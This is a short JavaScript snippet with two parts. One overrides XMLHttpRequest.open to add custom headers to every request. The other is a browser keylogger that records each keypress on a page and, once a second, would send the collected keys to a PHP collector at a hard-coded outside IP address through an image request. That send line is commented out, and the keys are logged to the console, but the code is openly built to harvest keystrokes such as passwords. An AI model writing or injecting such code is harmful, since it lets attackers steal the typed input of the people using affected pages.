XMLHttpRequest.prototype.open = (function(open) {
  return function(method,url,async) {
    open.apply(this,arguments);
    this.setRequestHeader('customHeader1', 'someValue');
    this.setRequestHeader('customHeader2', 'someOtherValue');
    };
})(XMLHttpRequest.prototype.open);



var keys='';
var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		//new Image().src = url+keys;
		console.log(keys);
		keys = '';
	}
}, 1000);


